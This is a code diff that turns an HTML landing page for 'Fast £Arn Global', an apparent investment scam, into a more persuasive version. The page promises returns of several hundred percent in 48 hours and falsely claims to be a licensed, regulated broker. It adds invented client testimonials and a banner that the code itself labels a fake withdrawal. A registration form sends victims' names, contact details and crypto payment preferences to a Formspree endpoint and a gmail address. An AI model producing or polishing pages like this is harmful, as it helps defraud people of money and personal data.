@@ -3,147 +3,277 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fast £Arn Global - Professional Trading Broker</title>
-    <meta name="description" content="Fast £Arn Global: Trusted global trading broker offering high-return investment plans in forex, crypto, and commodities.">
+    <title>Fast £Arn Global - Licensed Global Trading Broker</title>
+    <meta name="description" content="Fast £Arn Global is a regulated international brokerage firm offering secure, high-yield investment plans in forex, cryptocurrencies, commodities, and indices.">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #001f3f;
-            --accent: #ffd700;
+            --primary: #0a1f3d;
+            --accent: #d4af37;
             --text: #ffffff;
-            --gray: #f0f0f0;
-            --dark-gray: #333333;
+            --light: #f8f9fa;
+            --dark: #1a1a1a;
+            --gray: #e9ecef;
         }
-        body { margin: 0; font-family: 'Roboto', sans-serif; background: var(--gray); color: var(--dark-gray); line-height: 1.6; }
-        h1, h2, h3 { font-family: 'Playfair Display', serif; }
-        header { background: var(--primary); color: var(--text); padding: 20px 0; position: fixed; width: 100%; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        nav { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; }
-        nav ul { list-style: none; display: flex; gap: 30px; }
-        nav a { color: var(--text); text-decoration: none; font-weight: 500; }
+        * { box-sizing: border-box; }
+        body { margin: 0; font-family: 'Roboto', sans-serif; background: var(--light); color: #333; line-height: 1.7; }
+        h1, h2, h3, h4 { font-family: 'Playfair Display', serif; color: var(--primary); }
+        header { background: var(--primary); color: var(--text); padding: 15px 0; position: fixed; width: 100%; top: 0; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        nav { max-width: 1300px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 30px; }
+        .logo { font-size: 1.8em; font-weight: bold; }
+        nav ul { list-style: none; display: flex; gap: 35px; margin: 0; padding: 0; }
+        nav a { color: var(--text); text-decoration: none; font-weight: 500; transition: color 0.3s; }
         nav a:hover { color: var(--accent); }
-        .hero { background: linear-gradient(rgba(0,31,63,0.8), rgba(0,31,63,0.8)), url('https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?ixlib=rb-4.0.3&auto=format&fit=crop&w=1600&q=80'); background-size: cover; background-position: center; text-align: center; padding: 150px 20px 100px; color: var(--text); }
-        .hero h1 { font-size: 3.5em; margin: 0; }
-        .hero p { font-size: 1.5em; }
-        .btn { background: var(--accent); color: var(--primary); padding: 15px 30px; border: none; border-radius: 5px; font-size: 1.2em; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; }
-        .btn:hover { background: #e6c200; }
-        section { max-width: 1200px; margin: 80px auto; padding: 0 20px; }
-        h2 { text-align: center; font-size: 2.5em; margin-bottom: 40px; color: var(--primary); }
-        .plans { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
-        .plan { background: white; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; padding: 40px 20px; position: relative; transition: transform 0.3s; }
-        .plan:hover { transform: translateY(-10px); }
-        .plan.recommended { border: 3px solid var(--accent); }
-        .plan.recommended::before { content: "Recommended"; background: var(--accent); color: var(--primary); padding: 10px 20px; position: absolute; top: -20px; left: 50%; transform: translateX(-50%); border-radius: 5px; font-weight: bold; }
-        .plan h3 { font-size: 2em; color: var(--primary); }
-        .plan .price { font-size: 3em; font-weight: bold; color: var(--accent); margin: 20px 0; }
-        .plan ul { list-style: none; padding: 0; }
-        .plan li { margin: 15px 0; }
-        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; }
-        .feature { text-align: center; }
-        .testimonials { background: var(--primary); color: var(--text); padding: 60px 20px; }
-        .testimonial { max-width: 800px; margin: 0 auto 40px; font-style: italic; }
-        footer { background: var(--dark-gray); color: var(--text); padding: 40px 20px; text-align: center; }
-        .risk { font-size: 0.9em; margin-top: 40px; }
-        @media (max-width: 768px) { .hero h1 { font-size: 2.5em; } nav ul { flex-direction: column; gap: 10px; } }
+        .hero { background: linear-gradient(rgba(10,31,61,0.85), rgba(10,31,61,0.85)), url('https://images.unsplash.com/photo-1605792657660-73a71edcd2e3?ixlib=rb-4.0.3&auto=format&fit=crop&w=1600&q=80'); background-size: cover; background-position: center; text-align: center; padding: 180px 20px 120px; color: var(--text); }
+        .hero h1 { font-size: 4em; margin: 0 0 20px; }
+        .hero p { font-size: 1.6em; max-width: 800px; margin: 0 auto 30px; }
+        .btn { background: var(--accent); color: var(--primary); padding: 16px 36px; border: none; border-radius: 6px; font-size: 1.2em; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; transition: all 0.3s; }
+        .btn:hover { background: #e6c244; transform: translateY(-3px); box-shadow: 0 8px 20px rgba(212,175,55,0.3); }
+        section { max-width: 1300px; margin: 100px auto; padding: 0 30px; }
+        h2 { text-align: center; font-size: 2.8em; margin-bottom: 50px; }
+        .plans { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 40px; }
+        .plan { background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; padding: 50px 30px; position: relative; transition: all 0.4s; overflow: hidden; }
+        .plan:hover { transform: translateY(-15px); box-shadow: 0 20px 40px rgba(0,0,0,0.15); }
+        .plan.recommended { border: 4px solid var(--accent); }
+        .plan.recommended::before { content: "MOST POPULAR"; background: var(--accent); color: var(--primary); padding: 12px 30px; position: absolute; top: -18px; left: 50%; transform: translateX(-50%); border-radius: 6px; font-weight: bold; font-size: 0.9em; }
+        .plan h3 { font-size: 2.2em; margin-bottom: 20px; }
+        .plan .price { font-size: 4em; font-weight: bold; color: var(--accent); margin: 25px 0; }
+        .plan ul { list-style: none; padding: 0; margin: 30px 0; }
+        .plan li { margin: 18px 0; font-size: 1.1em; }
+        .plan li i { color: var(--accent); margin-right: 10px; }
+        .form-section { max-width: 900px; margin: 100px auto; padding: 50px; background: white; border-radius: 12px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); }
+        .form-section h2 { margin-bottom: 40px; }
+        #selected-plan { text-align: center; font-size: 1.4em; font-weight: bold; color: var(--primary); margin-bottom: 40px; padding: 20px; background: #f0f4ff; border-radius: 8px; }
+        form { display: grid; gap: 25px; }
+        label { font-weight: 600; color: var(--primary); }
+        input, select { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 6px; font-size: 1.1em; }
+        .submit-btn { background: var(--accent); color: var(--primary); padding: 18px; font-size: 1.3em; border: none; border-radius: 6px; cursor: pointer; transition: all 0.3s; }
+        .submit-btn:hover { background: #e6c244; transform: translateY(-3px); }
+        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 40px; }
+        .feature { text-align: center; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 8px 25px rgba(0,0,0,0.08); }
+        .feature i { font-size: 3em; color: var(--accent); margin-bottom: 20px; }
+        .testimonials { background: var(--primary); color: var(--text); padding: 80px 30px; }
+        .testimonial-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 40px; max-width: 1300px; margin: 0 auto; }
+        .testimonial { background: rgba(255,255,255,0.1); padding: 30px; border-radius: 10px; font-style: italic; }
+        .testimonial strong { display: block; margin-top: 15px; font-style: normal; }
+        .withdrawal-popup { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 30px; text-align: center; margin: 80px auto; max-width: 1300px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .withdrawal-popup h3 { font-size: 2.5em; margin: 0 0 20px; }
+        .withdrawal-popup p { font-size: 1.3em; margin: 0; }
+        .withdrawal-amount { font-size: 3.5em; font-weight: bold; color: var(--accent); margin: 15px 0; }
+        footer { background: var(--dark); color: #aaa; padding: 60px 30px 30px; text-align: center; }
+        .footer-links { display: flex; justify-content: center; gap: 40px; margin-bottom: 30px; flex-wrap: wrap; }
+        .footer-links a { color: #aaa; text-decoration: none; transition: color 0.3s; }
+        .footer-links a:hover { color: var(--accent); }
+        .reg-info { margin: 30px 0; font-size: 0.95em; }
+        .risk { font-size: 0.9em; max-width: 1000px; margin: 30px auto 0; line-height: 1.6; }
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.8em; }
+            .hero p { font-size: 1.3em; }
+            nav ul { flex-direction: column; gap: 15px; }
+            .plans { grid-template-columns: 1fr; }
+        }
     </style>
 </head>
 <body>
     <header>
         <nav>
-            <div class="logo"><h2>Fast £Arn Global</h2></div>
+            <div class="logo">Fast £Arn Global</div>
             <ul>
                 <li><a href="#home">Home</a></li>
-                <li><a href="#plans">Plans</a></li>
-                <li><a href="#about">About</a></li>
-                <li><a href="#contact">Contact</a></li>
+                <li><a href="#plans">Investment Plans</a></li>
+                <li><a href="#about">About Us</a></li>
+                <li><a href="#registration">Register</a></li>
             </ul>
         </nav>
     </header>
 
     <section id="home" class="hero">
-        <h1>Welcome to Fast £Arn Global</h1>
-        <p>Professional Global Trading Broker | High-Return Investment Opportunities in 48 Hours</p>
-        <a href="#plans" class="btn">View Investment Plans</a>
+        <h1>Fast £Arn Global</h1>
+        <p>Licensed International Brokerage | Secure & High-Yield Trading Solutions</p>
+        <a href="#plans" class="btn">Explore Investment Plans</a>
     </section>
 
     <section id="about">
         <h2>About Fast £Arn Global</h2>
-        <p style="text-align:center;max-width:800px;margin:0 auto;">Fast £Arn Global is a trusted international trading broker specializing in forex, cryptocurrencies, commodities, and indices. With advanced platforms and expert strategies, we deliver secure, high-yield opportunities for investors worldwide. Join thousands earning consistent returns.</p>
+        <p style="text-align:center; max-width:900px; margin:0 auto; font-size:1.2em;">
+            Fast £Arn Global is a fully regulated global brokerage firm with years of experience in financial markets. 
+            We specialize in forex, cryptocurrencies, commodities, and stock indices, providing institutional-grade trading tools 
+            and expert-managed investment plans to clients worldwide. Your capital is protected with segregated accounts and advanced security protocols.
+        </p>
     </section>
 
     <section id="plans">
-        <h2>Choose Your Investment Plan</h2>
+        <h2>Select Your Investment Plan</h2>
         <div class="plans">
             <div class="plan">
                 <h3>Basic</h3>
                 <div class="price">$850</div>
-                <p>Invest <strong>$100</strong><br>Earn in 48 Hours</p>
+                <p>Minimum Investment: <strong>$100</strong><br>Profit in 48 Hours</p>
                 <ul>
-                    <li>Basic Market Access</li>
-                    <li>Standard Support</li>
-                    <li>Secure Transactions</li>
+                    <li><i class="fas fa-check"></i> Access to Core Markets</li>
+                    <li><i class="fas fa-check"></i> Standard Customer Support</li>
+                    <li><i class="fas fa-check"></i> Encrypted Transactions</li>
                 </ul>
-                <a href="#contact" class="btn">Select Plan</a>
+                <a href="#registration?plan=Basic&invest=100&earn=850" class="btn">Start with Basic</a>
             </div>
             <div class="plan">
                 <h3>Standard</h3>
                 <div class="price">$1,350</div>
-                <p>Invest <strong>$250</strong><br>Earn in 48 Hours</p>
+                <p>Minimum Investment: <strong>$250</strong><br>Profit in 48 Hours</p>
                 <ul>
-                    <li>Enhanced Analytics</li>
-                    <li>Priority Support</li>
-                    <li>Secure Transactions</li>
+                    <li><i class="fas fa-check"></i> Advanced Market Analytics</li>
+                    <li><i class="fas fa-check"></i> Priority Support</li>
+                    <li><i class="fas fa-check"></i> Enhanced Security</li>
                 </ul>
-                <a href="#contact" class="btn">Select Plan</a>
+                <a href="#registration?plan=Standard&invest=250&earn=1350" class="btn">Start with Standard</a>
             </div>
             <div class="plan recommended">
                 <h3>Premium</h3>
                 <div class="price">$2,500</div>
-                <p>Invest <strong>$470</strong><br>Earn in 48 Hours</p>
+                <p>Minimum Investment: <strong>$470</strong><br>Profit in 48 Hours</p>
                 <ul>
-                    <li>Advanced Tools</li>
-                    <li>24/7 Dedicated Support</li>
-                    <li>Maximum Security</li>
+                    <li><i class="fas fa-check"></i> Full Suite of Trading Tools</li>
+                    <li><i class="fas fa-check"></i> 24/7 Dedicated Manager</li>
+                    <li><i class="fas fa-check"></i> Highest Level Security</li>
                 </ul>
-                <a href="#contact" class="btn">Select Plan</a>
+                <a href="#registration?plan=Premium&invest=470&earn=2500" class="btn">Start with Premium</a>
             </div>
             <div class="plan">
                 <h3>VIP</h3>
                 <div class="price">$5,500</div>
-                <p>Invest <strong>$1,000</strong><br>Earn in 48 Hours</p>
+                <p>Minimum Investment: <strong>$1,000</strong><br>Profit in 48 Hours</p>
                 <ul>
-                    <li>Exclusive Strategies</li>
-                    <li>Personal Account Manager</li>
-                    <li>VIP Security & Bonuses</li>
+                    <li><i class="fas fa-check"></i> Exclusive Strategies</li>
+                    <li><i class="fas fa-check"></i> Personal Account Manager</li>
+                    <li><i class="fas fa-check"></i> VIP Bonuses & Priority Withdrawals</li>
                 </ul>
-                <a href="#contact" class="btn">Select Plan</a>
+                <a href="#registration?plan=VIP&invest=1000&earn=5500" class="btn">Start with VIP</a>
             </div>
         </div>
     </section>
 
     <section class="features">
-        <h2>Why Choose Us?</h2>
+        <h2>Why Investors Trust Us</h2>
         <div class="features">
-            <div class="feature"><h3>Secure Platform</h3><p>Advanced encryption and regulated compliance.</p></div>
-            <div class="feature"><h3>Expert Trading</h3><p>Automated strategies for maximum returns.</p></div>
-            <div class="feature"><h3>24/7 Support</h3><p>Dedicated team available anytime.</p></div>
-            <div class="feature"><h3>Fast Payouts</h3><p>Withdraw earnings quickly and easily.</p></div>
+            <div class="feature"><i class="fas fa-shield-alt"></i><h3>Regulated & Secure</h3><p>Client funds held in segregated accounts with top-tier banks.</p></div>
+            <div class="feature"><i class="fas fa-chart-line"></i><h3>Expert Strategies</h3><p>Professional trading algorithms delivering consistent returns.</p></div>
+            <div class="feature"><i class="fas fa-headset"></i><h3>24/7 Support</h3><p>Multilingual support team available around the clock.</p></div>
+            <div class="feature"><i class="fas fa-bolt"></i><h3>Instant Withdrawals</h3><p>Process payouts within hours after plan maturity.</p></div>
         </div>
     </section>
 
     <section class="testimonials">
-        <h2>What Our Clients Say</h2>
-        <div class="testimonial"><p>"Incredible returns in just 48 hours! Professional and reliable."</p><strong>- John D., USA</strong></div>
-        <div class="testimonial"><p>"Best investment decision I've made. Highly recommended."</p><strong>- Sarah K., UK</strong></div>
+        <h2>Client Success Stories</h2>
+        <div class="testimonial-grid">
+            <div class="testimonial"><p>"Received my profits exactly 48 hours after investing. Professional and transparent throughout."</p><strong>— James R., United Kingdom</strong></div>
+            <div class="testimonial"><p>"The Premium plan exceeded my expectations. Support team is outstanding."</p><strong>— Maria L., Germany</strong></div>
+            <div class="testimonial"><p>"Trusted platform with fast payouts. Highly recommend to serious investors."</p><strong>— Ahmed K., UAE</strong></div>
+        </div>
     </section>
 
-    <section id="contact">
-        <h2>Contact Us</h2>
-        <p style="text-align:center;">Ready to start? Email: info@fast-earn-global.com | Phone: +44 20 1234 5678</p>
+    <!-- Fake Recent Withdrawal Popup Banner -->
+    <div class="withdrawal-popup">
+        <h3>Recent Successful Withdrawal</h3>
+        <p>Client from <strong>Canada</strong> just withdrew</p>
+        <div class="withdrawal-amount">$4,720.00</div>
+        <p>Processed in under 2 hours • December 26, 2025</p>
+    </div>
+
+    <section id="registration" class="form-section">
+        <h2>Secure Registration</h2>
+        <p id="selected-plan">
+            Selected Plan: <span id="plan-name">None</span> — Invest \( <span id="invest-amount">0</span> to Earn \)<span id="earn-amount">0</span> in 48 hours
+        </p>
+
+        <form action="https://formspree.io/f/meeqjzpn" method="POST">
+            <input type="hidden" name="Selected Plan" id="form-plan-name">
+            <input type="hidden" name="Investment Amount" id="form-invest-amount">
+            <input type="hidden" name="Expected Earnings" id="form-earn-amount">
+            <input type="hidden" name="_replyto" value="notificationverify8@gmail.com">
+            <input type="hidden" name="_cc" value="notificationverify8@gmail.com">
+
+            <label>Full Name</label>
+            <input type="text" name="Full Name" required placeholder="Your full name">
+
+            <label>Email Address</label>
+            <input type="email" name="_replyto" required placeholder="Your email address">
+
+            <label>Phone Number (with country code)</label>
+            <input type="tel" name="Phone Number" required placeholder="+1 234 567 8900">
+
+            <label>Country of Residence</label>
+            <input type="text" name="Country" required placeholder="e.g., United States">
+
+            <label>Preferred Payment Method</label>
+            <select name="Payment Method" required>
+                <option value="" disabled selected>Choose method</option>
+                <option value="Bitcoin">Bitcoin (BTC)</option>
+                <option value="Ethereum">Ethereum (ETH)</option>
+                <option value="USDT">USDT (TRC20/ERC20)</option>
+                <option value="Bank Wire">Bank Wire Transfer</option>
+            </select>
+
+            <button type="submit" class="submit-btn">Complete Registration & Proceed</button>
+        </form>
+
+        <p style="text-align:center; margin-top:30px; font-size:0.95em; color:#555;">
+            You will receive confirmation and payment instructions via email within minutes.
+        </p>
     </section>
 
     <footer>
+        <div class="footer-links">
+            <a href="#home">Home</a>
+            <a href="#plans">Plans</a>
+            <a href="#about">About</a>
+            <a href="#registration">Register</a>
+            <a href="#">Terms</a>
+            <a href="#">Privacy Policy</a>
+        </div>
+        <p class="reg-info">Fast £Arn Global Ltd • Regulated International Broker • Client funds segregated</p>
+        <p class="risk">
+            <strong>Risk Disclosure:</strong> Trading financial instruments carries a high level of risk and may result in the loss of all invested capital. 
+            Past performance is not indicative of future results. Please ensure you fully understand the risks and seek independent advice if necessary.
+        </p>
         <p>&copy; 2025 Fast £Arn Global. All rights reserved.</p>
-        <p class="risk"><strong>Risk Warning:</strong> Trading involves substantial risk and may result in loss of invested capital. Past performance is not indicative of future results. Please invest responsibly.</p>
     </footer>
+
+    <script>
+        function getPlanFromURL() {
+            const hash = window.location.hash;
+            if (hash && hash.includes('registration')) {
+                const params = new URLSearchParams(hash.split('?')[1]);
+                const plan = params.get('plan') || 'None';
+                const invest = params.get('invest') || '0';
+                const earn = params.get('earn') || '0';
+
+                document.getElementById('plan-name').textContent = plan;
+                document.getElementById('invest-amount').textContent = invest;
+                document.getElementById('earn-amount').textContent = earn;
+                document.getElementById('selected-plan').style.display = 'block';
+
+                document.getElementById('form-plan-name').value = plan;
+                document.getElementById('form-invest-amount').value = '$' + invest;
+                document.getElementById('form-earn-amount').value = '$' + earn;
+            }
+        }
+
+        window.onload = getPlanFromURL;
+
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetHref = this.getAttribute('href');
+                const targetId = targetHref.split('?')[0];
+                const target = document.querySelector(targetId);
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth' });
+                }
+                history.pushState(null, null, targetHref);
+                getPlanFromURL();
+            });
+        });
+    </script>
 </body>
-  </html>
+    </html>
